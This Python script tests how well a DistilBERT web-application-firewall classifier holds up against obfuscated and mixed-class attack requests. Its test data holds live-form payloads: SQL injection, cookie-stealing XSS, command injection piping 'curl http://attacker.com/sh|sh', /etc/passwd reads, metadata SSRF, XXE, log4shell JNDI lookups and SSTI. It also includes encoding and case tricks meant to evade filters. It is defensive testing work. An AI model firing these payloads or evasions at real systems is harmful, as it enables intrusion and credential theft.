#!/usr/bin/env python3
"""
Robustness / adversarial test for WAF DistilBERT classifier.

This is intentionally orthogonal to eval_model_v5.py:

    eval_model_v5.py    → "does the model handle diverse cases?" (coverage)
    test_v6_robustness  → "can attackers slip past the model with obfuscation,
                          adversarial composition, or cross-class confusion?"

Three independent suites:

  A. Obfuscation ladder
     Same base attack at 6 progressive obfuscation levels:
       L0  raw            — naive attack
       L1  url_encode_1   — single percent-encoding (WAF Go decodes 1 layer)
       L2  url_encode_2   — double percent-encoding (should NOT decode at infer)
       L3  case_mutate    — random-case keywords (SeLeCt, UnIoN, ScRiPt)
       L4  whitespace     — inflate /**/ comments, tabs, CRLF inside attack
       L5  noise_wrap     — wrap attack in benign content (legitimate query
                            preamble + attack + benign suffix)
     Reports per-class survival rate at each level.

  B. Cross-class adversarial
     Payloads carrying tokens of multiple attack families to test whether
     the model commits to the right one (sqli with XSS-like quotes, cmdi
     with log4shell-like ${...}, etc).

  C. Confidence calibration spot-check
     Edge / borderline payloads: model should still pick the right class
     but with realistic (not 1.00) confidence.

Usage:
    python scripts/test_v6_robustness.py \
        --model model_v6/final_model_v6 \
        [--baseline ml-service/model_v5/extracted/model/final_model_v5]

When --baseline is given, prints side-by-side suite-A survival comparison.
"""
from __future__ import annotations

import argparse
import json
import os
import sys
import urllib.parse
from collections import defaultdict
from typing import Callable, Dict, List, Tuple

import torch
from transformers import AutoTokenizer, AutoModelForSequenceClassification


# --------------------------------------------------------------------------- #
# Canonical compose helper — must match Go internal/training/canonical.go      #
# --------------------------------------------------------------------------- #
HEADER_ORDER = [
    "Host", "User-Agent", "Content-Type", "Referer", "X-Forwarded-For",
    "X-Real-IP", "X-Requested-With", "Origin", "Cookie", "Authorization",
]


def decode_once(s: str) -> str:
    if not s or "%" not in s:
        return s
    try:
        return urllib.parse.unquote(s)
    except Exception:
        return s


def compose(method: str, path: str, headers: Dict[str, str] | None = None, body: str = "") -> str:
    headers = headers or {}
    path = decode_once(path)
    body = decode_once(body)
    lines = [f"{method.upper()} {path}"]
    for h in HEADER_ORDER:
        v = headers.get(h) or headers.get(h.lower())
        if v:
            lines.append(f"{h}: {v}")
    out = "\n".join(lines)
    if body:
        out += "\n\n" + body
    return out


UA_CHROME = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
UA_CURL = "curl/8.4.0"


# --------------------------------------------------------------------------- #
# Suite A — Obfuscation ladder                                                 #
# --------------------------------------------------------------------------- #

# Each base attack: (label, generator(payload) → request_dict)
# `payload` is the dangerous substring, mutated by each obfuscation level.
# The generator inserts it into a host request shape.
BASE_ATTACKS: List[Tuple[str, str, Callable]] = [
    # SQLi via query string
    ("sqli", "' OR '1'='1",
        lambda p: dict(method="GET", path=f"/products?id={p}",
                       headers={"Host": "shop.example.com", "User-Agent": UA_CHROME})),
    ("sqli", "1 UNION SELECT username,password FROM users",
        lambda p: dict(method="GET", path=f"/news?id={p}",
                       headers={"Host": "news.example.com", "User-Agent": UA_CHROME})),

    # XSS via query string
    ("xss", "<script>alert(1)</script>",
        lambda p: dict(method="GET", path=f"/search?q={p}",
                       headers={"Host": "shop.example.com", "User-Agent": UA_CHROME})),
    ("xss", "<img src=x onerror=alert(document.cookie)>",
        lambda p: dict(method="GET", path=f"/p?name={p}",
                       headers={"Host": "blog.example.com", "User-Agent": UA_CHROME})),

    # CMDi via query string
    ("cmdi", ";cat /etc/passwd",
        lambda p: dict(method="GET", path=f"/ping?h=8.8.8.8{p}",
                       headers={"Host": "ops.example.com", "User-Agent": UA_CURL})),
    ("cmdi", "$(curl http://attacker.com/sh|sh)",
        lambda p: dict(method="GET", path=f"/run?cmd={p}",
                       headers={"Host": "tools.example.com", "User-Agent": UA_CURL})),

    # Path traversal via query
    ("path_traversal", "../../../../etc/passwd",
        lambda p: dict(method="GET", path=f"/static?file={p}",
                       headers={"Host": "cdn.example.com", "User-Agent": UA_CHROME})),

    # SSRF via query
    ("ssrf", "http://169.254.169.254/latest/meta-data/",
        lambda p: dict(method="GET", path=f"/proxy?url={p}",
                       headers={"Host": "tools.example.com", "User-Agent": UA_CHROME})),

    # XXE — body XML
    ("xxe", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        lambda p: dict(method="POST", path="/api/import",
                       headers={"Host": "api.example.com", "User-Agent": UA_CURL,
                                "Content-Type": "application/xml"},
                       body=p)),

    # Log4shell — UA header
    ("log4shell", "${jndi:ldap://attacker.com/a}",
        lambda p: dict(method="GET", path="/",
                       headers={"Host": "app.example.com", "User-Agent": p})),
    # Log4shell — body
    ("log4shell", "${jndi:ldap://attacker.com/a}",
        lambda p: dict(method="POST", path="/feedback",
                       headers={"Host": "www.example.com", "User-Agent": UA_CHROME,
                                "Content-Type": "application/x-www-form-urlencoded"},
                       body=f"msg={p}")),

    # SSTI via query
    ("ssti", "{{7*7}}",
        lambda p: dict(method="GET", path=f"/render?tpl={p}",
                       headers={"Host": "tpl.example.com", "User-Agent": UA_CHROME})),
    ("ssti", "{{config.items()}}",
        lambda p: dict(method="GET", path=f"/p?name={p}",
                       headers={"Host": "app.example.com", "User-Agent": UA_CHROME})),

    # NoSQLi — JSON body
    ("nosqli", '{"username":{"$ne":null},"password":{"$ne":null}}',
        lambda p: dict(method="POST", path="/login",
                       headers={"Host": "app.example.com", "User-Agent": UA_CHROME,
                                "Content-Type": "application/json"},
                       body=p)),
]


# Obfuscation level transforms operate on the payload string.
def L0_raw(p: str) -> str:
    return p


def L1_url1(p: str) -> str:
    """Single URL-encoding — WAF Go decode_once unwraps this."""
    return urllib.parse.quote(p, safe="")


def L2_url2(p: str) -> str:
    """Double URL-encoding — WAF only decodes 1 layer, so model sees still-encoded."""
    return urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")


def L3_case(p: str) -> str:
    """Case-mutate SQL/JS/shell keywords."""
    import re
    keywords = [
        "select", "union", "from", "where", "or", "and", "drop", "table",
        "script", "alert", "onerror", "img", "svg", "iframe",
        "cat", "curl", "bash", "sh", "wget", "nc",
        "etc", "passwd", "shadow",
        "jndi", "ldap", "rmi", "dns",
        "config", "items", "request",
    ]
    out = p
    for kw in keywords:
        def mut(m):
            s = m.group(0)
            # Alternate case: SeLeCt, UnIoN, etc.
            return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s))
        out = re.sub(re.escape(kw), mut, out, flags=re.IGNORECASE)
    return out


def L4_whitespace(p: str) -> str:
    """Insert SQL /**/ comments and tab/CRLF between tokens."""
    # SQL-flavoured: /**/ between keywords. JS: tab/newline. Shell: $IFS$9.
    p2 = p
    # Insert SQL comment between SQL keywords.
    p2 = p2.replace(" UNION ", "/**/UNION/**/").replace(" SELECT ", "/**/SELECT/**/")
    p2 = p2.replace(" OR ", "/**/OR/**/").replace(" AND ", "/**/AND/**/")
    p2 = p2.replace(" FROM ", "/**/FROM/**/")
    # JS-flavour: tab/newline.
    p2 = p2.replace("<script>", "<script\t>").replace("</script>", "</script\n>")
    p2 = p2.replace("onerror=", "onerror\t=")
    # Shell-flavour.
    p2 = p2.replace(" /etc/", "${IFS}/etc/").replace("cat ", "cat${IFS}")
    return p2


def L5_noise(p: str) -> str:
    """Wrap payload in benign content — preamble + payload + suffix."""
    return f"prod_42_session_abc{p}&ts=1700000000&ver=2"


LEVELS: List[Tuple[str, Callable]] = [
    ("L0_raw", L0_raw),
    ("L1_url1", L1_url1),
    ("L2_url2", L2_url2),
    ("L3_case", L3_case),
    ("L4_whitespace", L4_whitespace),
    ("L5_noise", L5_noise),
]


# --------------------------------------------------------------------------- #
# Suite B — Cross-class adversarial                                            #
# --------------------------------------------------------------------------- #
# Payloads engineered to carry tokens of MULTIPLE attack families. The "gold"
# label is what the dominant attack class should be — we want to see if the
# model gets distracted by the noise tokens or commits to the right family.
CROSS_CLASS: List[Tuple[str, dict]] = [
    # SQLi payload but with HTML tags inside (looks XSS-ish)
    ("sqli", dict(method="GET", path="/p?id=1'+OR+'<script>'='<script>",
                  headers={"Host": "shop.example.com", "User-Agent": UA_CHROME})),
    # CMDi with ${...} (looks log4shell-ish)
    ("cmdi", dict(method="GET", path="/run?cmd=${USER};cat /etc/passwd",
                  headers={"Host": "ops.example.com", "User-Agent": UA_CURL})),
    # SQLi with JSON-NoSQLi-shape mixin
    ("sqli", dict(method="POST", path="/api/v1/q",
                  headers={"Host": "api.example.com", "User-Agent": UA_CURL,
                           "Content-Type": "application/json"},
                  body='{"q":"1\' OR 1=1--","$comment":"noise"}')),
    # XSS that contains SQL-like keyword
    ("xss", dict(method="GET", path="/p?html=<script>SELECT*FROM(alert(1))</script>",
                 headers={"Host": "shop.example.com", "User-Agent": UA_CHROME})),
    # Log4shell with SQL noise around it
    ("log4shell", dict(method="GET", path="/", headers={
        "Host": "app.example.com",
        "User-Agent": "Mozilla; UNION SELECT ${jndi:ldap://x/a} FROM users",
    })),
    # SSTI containing system() — overlap with cmdi
    ("ssti", dict(method="POST", path="/render",
                  headers={"Host": "app.example.com", "User-Agent": UA_CHROME,
                           "Content-Type": "application/x-www-form-urlencoded"},
                  body="tpl={{ ''.__class__.__mro__[1].__subclasses__()[401](['id']) }}")),
    # Path traversal in JSON body (looks like config payload)
    ("path_traversal", dict(method="POST", path="/api/read",
                            headers={"Host": "api.example.com", "User-Agent": UA_CHROME,
                                     "Content-Type": "application/json"},
                            body='{"file":"/uploads/../../../etc/passwd","metadata":{"size":1024}}')),
    # NoSQLi shaped like SQL string
    ("nosqli", dict(method="GET", path="/find?u[$regex]=^admin'--",
                    headers={"Host": "api.example.com", "User-Agent": UA_CHROME})),
    # SSRF inside SQL-looking query param name
    ("ssrf", dict(method="GET", path="/api/render?select_url=http://169.254.169.254/",
                  headers={"Host": "api.example.com", "User-Agent": UA_CURL})),
    # XXE with command-injection-looking entity name
    ("xxe", dict(method="POST", path="/api/x",
                 headers={"Host": "api.example.com", "User-Agent": UA_CURL,
                          "Content-Type": "application/xml"},
                 body='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY cat SYSTEM "file:///etc/passwd">]><r>$(echo &cat;)</r>')),
]


# --------------------------------------------------------------------------- #
# Suite C — Confidence calibration                                             #
# --------------------------------------------------------------------------- #
# Edge cases where the gold label is unambiguous to a human but the input is
# minimal / ambiguous to a model. We expect correct prediction with confidence
# in [0.5, 0.99] — anything 1.000 on these is suspicious (memorization).
CALIBRATION: List[Tuple[str, dict, Tuple[float, float]]] = [
    # Minimal SQLi — no quote, no comment, single keyword.
    ("sqli", dict(method="GET", path="/p?id=1 OR 1=1",
                  headers={"Host": "shop.example.com", "User-Agent": UA_CHROME}),
     (0.5, 0.999)),
    # Minimal XSS — no closing tag.
    ("xss", dict(method="GET", path="/q?x=<svg onload=alert(1)",
                 headers={"Host": "x.example.com", "User-Agent": UA_CHROME}),
     (0.5, 0.999)),
    # CMDi with no separator — just suspicious tool name.
    ("cmdi", dict(method="GET", path="/exec?cmd=wget http://attacker.com/sh.sh",
                  headers={"Host": "ops.example.com", "User-Agent": UA_CURL}),
     (0.4, 0.999)),  # Could legitimately be normal — model might hedge.
    # Borderline normal — looks like SQL but is a documentation URL.
    ("normal", dict(method="GET", path="/docs/sql/SELECT-statement.html",
                    headers={"Host": "docs.example.com", "User-Agent": UA_CHROME}),
     (0.3, 0.999)),
    # Borderline normal — search with `<` symbol (not a tag).
    ("normal", dict(method="GET", path="/search?q=age<18",
                    headers={"Host": "shop.example.com", "User-Agent": UA_CHROME}),
     (0.3, 0.999)),
    # Minimal log4shell — no protocol, just `${jndi:`.
    ("log4shell", dict(method="GET", path="/?x=${jndi:",
                       headers={"Host": "x.example.com", "User-Agent": UA_CHROME}),
     (0.4, 0.999)),
]


# --------------------------------------------------------------------------- #
# Eval helpers                                                                 #
# --------------------------------------------------------------------------- #
def load_labels(model_dir: str) -> List[str]:
    for fname in ("label_config.json", "config.json"):
        p = os.path.join(model_dir, fname)
        if os.path.exists(p):
            with open(p) as f:
                blob = json.load(f)
            id2 = blob.get("id2label")
            if id2:
                return [v for _, v in sorted(((int(k), v) for k, v in id2.items()))]
    raise SystemExit(f"no id2label in {model_dir}")


def predict_batch(model, tokenizer, texts: List[str], labels: List[str], device: str):
    enc = tokenizer(texts, truncation=True, max_length=256, padding=True,
                    return_tensors="pt", return_token_type_ids=False).to(device)
    with torch.no_grad():
        probs = torch.softmax(model(**enc).logits, dim=-1).cpu().tolist()
    out = []
    for p in probs:
        ix = int(max(range(len(p)), key=lambda i: p[i]))
        out.append({"label": labels[ix], "conf": float(p[ix]),
                    "scores": {labels[i]: float(p[i]) for i in range(len(labels))}})
    return out


# --------------------------------------------------------------------------- #
# Suite runners                                                                #
# --------------------------------------------------------------------------- #
def run_suite_A(model, tokenizer, labels, device) -> Dict:
    """Build all (base × level) pairs, predict, compute survival per level."""
    samples = []
    for gold, payload, gen in BASE_ATTACKS:
        for level_name, transform in LEVELS:
            mutated = transform(payload)
            req = gen(mutated)
            text = compose(**req)
            samples.append(dict(gold=gold, level=level_name, text=text,
                                base=payload[:40]))
    preds = predict_batch(model, tokenizer, [s["text"] for s in samples], labels, device)
    for s, p in zip(samples, preds):
        s["pred"] = p["label"]
        s["conf"] = p["conf"]
        s["correct"] = (p["label"] == s["gold"])
        # "attack survived" = attack still classified as ANY attack (not normal).
        # Granular per-class drift can still happen but binary safety holds.
        s["caught_as_attack"] = (p["label"] != "normal")

    # Per-level survival rate.
    by_level = defaultdict(lambda: {"correct": 0, "caught": 0, "total": 0})
    for s in samples:
        by_level[s["level"]]["total"] += 1
        if s["correct"]:
            by_level[s["level"]]["correct"] += 1
        if s["caught_as_attack"]:
            by_level[s["level"]]["caught"] += 1

    # Per-class × per-level grid (correct flag).
    grid = defaultdict(lambda: defaultdict(lambda: {"c": 0, "t": 0}))
    for s in samples:
        cell = grid[s["gold"]][s["level"]]
        cell["t"] += 1
        if s["correct"]:
            cell["c"] += 1

    return {"samples": samples, "by_level": dict(by_level), "grid": dict(grid)}


def run_suite_B(model, tokenizer, labels, device) -> Dict:
    samples = []
    for gold, req in CROSS_CLASS:
        samples.append(dict(gold=gold, text=compose(**req), req=req))
    preds = predict_batch(model, tokenizer, [s["text"] for s in samples], labels, device)
    for s, p in zip(samples, preds):
        s["pred"] = p["label"]
        s["conf"] = p["conf"]
        s["correct"] = (p["label"] == s["gold"])
        s["caught_as_attack"] = (p["label"] != "normal")
    return {"samples": samples}


def run_suite_C(model, tokenizer, labels, device) -> Dict:
    samples = []
    for gold, req, (lo, hi) in CALIBRATION:
        samples.append(dict(gold=gold, text=compose(**req), req=req,
                            conf_lo=lo, conf_hi=hi))
    preds = predict_batch(model, tokenizer, [s["text"] for s in samples], labels, device)
    for s, p in zip(samples, preds):
        s["pred"] = p["label"]
        s["conf"] = p["conf"]
        s["correct"] = (p["label"] == s["gold"])
        s["conf_ok"] = s["conf_lo"] <= s["conf"] <= s["conf_hi"]
    return {"samples": samples}


# --------------------------------------------------------------------------- #
# Reporting                                                                    #
# --------------------------------------------------------------------------- #
def print_suite_A(result, model_name="model"):
    print(f"\n{'=' * 70}\nSUITE A — Obfuscation ladder   ({model_name})\n{'=' * 70}")
    print(f"{'Level':<16} {'Correct class':>14} {'Caught as atk':>14} {'Survival %':>11}")
    for lvl, _ in LEVELS:
        d = result["by_level"][lvl]
        pct_correct = 100 * d["correct"] / d["total"]
        pct_caught = 100 * d["caught"] / d["total"]
        print(f"{lvl:<16} {d['correct']:>4}/{d['total']:<9} {d['caught']:>4}/{d['total']:<9} "
              f"{pct_correct:>9.1f} %")

    # Per-class grid.
    print("\nPer-class × per-level CORRECT count")
    classes = sorted(result["grid"].keys())
    header = f"{'class':<16}" + "".join(f"{lvl[:10]:>11}" for lvl, _ in LEVELS)
    print(header)
    for c in classes:
        row = f"{c:<16}"
        for lvl, _ in LEVELS:
            cell = result["grid"][c].get(lvl, {"c": 0, "t": 0})
            row += f"   {cell['c']}/{cell['t']:<6}"
        print(row)


def print_suite_B(result, model_name="model"):
    print(f"\n{'=' * 70}\nSUITE B — Cross-class adversarial   ({model_name})\n{'=' * 70}")
    correct = sum(1 for s in result["samples"] if s["correct"])
    caught = sum(1 for s in result["samples"] if s["caught_as_attack"])
    n = len(result["samples"])
    print(f"Correct class:  {correct}/{n}  ({100*correct/n:.1f} %)")
    print(f"Caught as atk:  {caught}/{n}  ({100*caught/n:.1f} %)")
    print()
    for s in result["samples"]:
        status = "✓" if s["correct"] else ("~" if s["caught_as_attack"] else "✗")
        text_short = s["text"].replace("\n", " ⏎ ")[:90]
        print(f"  {status}  gold={s['gold']:<14} pred={s['pred']:<14} conf={s['conf']:.3f}  "
              f"{text_short}")


def print_suite_C(result, model_name="model"):
    print(f"\n{'=' * 70}\nSUITE C — Confidence calibration   ({model_name})\n{'=' * 70}")
    for s in result["samples"]:
        cls_ok = "✓" if s["correct"] else "✗"
        cnf_ok = "✓" if s.get("conf_ok") else "✗"
        text_short = s["text"].replace("\n", " ⏎ ")[:80]
        print(f"  class={cls_ok}  conf={cnf_ok}  gold={s['gold']:<14} pred={s['pred']:<14} "
              f"conf={s['conf']:.3f} expect∈[{s['conf_lo']},{s['conf_hi']}]")
        print(f"         {text_short}")


def print_compare_suite_A(r_main, r_base, name_main, name_base):
    print(f"\n{'=' * 70}\nCOMPARE Suite A: {name_main} vs {name_base}\n{'=' * 70}")
    print(f"{'Level':<16} {name_base[:18]:>20} {name_main[:18]:>20}  {'Δ':>8}")
    for lvl, _ in LEVELS:
        d_main = r_main["by_level"][lvl]
        d_base = r_base["by_level"][lvl]
        p_main = 100 * d_main["correct"] / d_main["total"]
        p_base = 100 * d_base["correct"] / d_base["total"]
        delta = p_main - p_base
        print(f"{lvl:<16} {p_base:>18.1f} % {p_main:>18.1f} %  {delta:>+7.1f}")


# --------------------------------------------------------------------------- #
# Main                                                                         #
# --------------------------------------------------------------------------- #
def load(model_dir, device):
    labels = load_labels(model_dir)
    tok = AutoTokenizer.from_pretrained(model_dir)
    mdl = AutoModelForSequenceClassification.from_pretrained(model_dir).to(device).eval()
    return tok, mdl, labels


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--model", required=True)
    ap.add_argument("--baseline", help="optional v5 dir for side-by-side")
    args = ap.parse_args()

    device = "cuda" if torch.cuda.is_available() else "cpu"
    print(f"[device] {device}")

    print(f"[load] {args.model}")
    tok, mdl, labels = load(args.model, device)

    rA = run_suite_A(mdl, tok, labels, device)
    rB = run_suite_B(mdl, tok, labels, device)
    rC = run_suite_C(mdl, tok, labels, device)
    print_suite_A(rA, model_name=os.path.basename(args.model.rstrip("/")))
    print_suite_B(rB, model_name=os.path.basename(args.model.rstrip("/")))
    print_suite_C(rC, model_name=os.path.basename(args.model.rstrip("/")))

    if args.baseline:
        print(f"\n[load] baseline {args.baseline}")
        tok_b, mdl_b, labels_b = load(args.baseline, device)
        rA_base = run_suite_A(mdl_b, tok_b, labels_b, device)
        print_compare_suite_A(rA, rA_base,
                              os.path.basename(args.model.rstrip("/")),
                              os.path.basename(args.baseline.rstrip("/")))

    # Exit non-zero if survival at L0_raw < 90% (real red flag).
    raw_pct = 100 * rA["by_level"]["L0_raw"]["correct"] / rA["by_level"]["L0_raw"]["total"]
    sys.exit(0 if raw_pct >= 90 else 1)


if __name__ == "__main__":
    main()
